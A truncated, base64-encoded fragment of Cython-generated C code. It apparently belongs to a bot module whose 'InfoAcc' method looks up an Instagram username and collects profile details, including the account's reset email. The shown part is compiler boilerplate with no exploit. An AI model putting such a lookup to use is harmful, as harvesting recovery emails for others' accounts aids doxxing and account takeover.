90XzMpOwogICAgZ290byBfX3B5eF9MMDsKICB9CgogIAoKICAKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuZGF0ZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdWlkKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzIxSW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMjFJbmZvQWNjID0geyJJbmZvQWNjIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydGZfNUdob3N0XzIxSW5mb0FjYywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzIxSW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUgPSAwOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZ2cgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbM10gPSB7MCwwLDB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkluZm9BY2MgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJuYW1lLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2csMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MM19lcnJvcikKICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHsKICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykgewogICAgICAgIGNhc2UgIDM6CiAgICAgICAgdmFsdWVzWzJdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDIpOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzJdKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDI6CiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDE6CiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDA6IGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICAgIH0KICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJnczsKICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgIkluZm9BY2MiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAzOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoIkluZm9BY2MiLCAxLCAzLCAzLCBpKTsgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAzKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIHZhbHVlc1syXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAyKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMl0pKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICAgIF9fcHl4X3ZfdXNlcm5hbWUgPSB2YWx1ZXNbMV07CiAgICBfX3B5eF92X2dnID0gdmFsdWVzWzJdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJJbmZvQWNjIiwgMSwgMywgMywgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMnRmXzVHaG9zdF8yMEluZm9BY2MoX19weXhfc2VsZiwgX19weXhfdl9zZWxmLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2dnKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzIwSW5mb0FjYyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9nZykgewogIFB5T2JqZWN0ICpfX3B5eF92X3JyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9JZCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZnVsbF9uYW1lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9mb3dzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9mb3dnID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9wcCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaXNQcmFpc2UgPSBOVUxMOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfYmlvID0gTlVMTDsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2lzX3ZlcmlmaWVkID0gTlVMTDsKICBpbnQgX19weXhfdl9tZXRhOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc2V0X2VtYWlsID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9lbWFpbCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc3MgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2lubGluZV9rZXlib2FyZCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcGF5bG9hZCA9IE5VTEw7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBzaXplX3QgX19weXhfdF8zOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIGludCBfX3B5eF90Xzk7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTM7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE4ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjBbMjNdOwogIFB5T2JqZWN0ICpfX3B5eF90XzIxID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yMlszXTsKICBpbnQgX19weXhfdF8yMzsKICBpbnQgX19weXhfdF8yNDsKICBjaGFyIGNvbnN0ICpfX3B5eF90XzI1OwogIFB5T2JqZWN0ICpfX3B5eF90XzI2ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzI5ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMzEgPSBOVUxMOwogIGNoYXIgY29uc3QgKl9fcHl4X3RfMzI7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiSW5mb0FjYyIsIDApOwoKICAKICBfX3B5eF90XzIgPSBfX3B5eF92X3NlbGY7CiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8zID0gMDsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG90YWx9OwogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI5OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNCwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfNik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X3RfNzsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfMyA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8yLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF90Xzh9OwogICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDMtX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDEsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICB9CiAgICAgIF9fcHl4X3ZfcnIgPSBfX3B5eF90XzE7CiAgICAgIF9fcHl4X3RfMSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzAyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgX19weXhfdl9JZCA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzMDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzAzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF92X2Z1bGxfbmFtZSA9IF9fcHl4X3RfMTsKICAgICAgX19weXhfdF8xID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX3B5eF92X2Zvd3MgPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzA1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fcHl4X3ZfZm93ZyA9IF9fcHl4X3RfMTsKICAgICAgX19weXhfdF8xID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzExXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMwNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgX19weXhfdl9wcCA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzMDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEyXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMwNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19weXhfdl9pc1ByYWlzZSA9IF9fcHl4X3RfMTsKICAgICAgX19weXhfdF8xID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMwOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgX19weXhfdl9iaW8gPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDksIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7C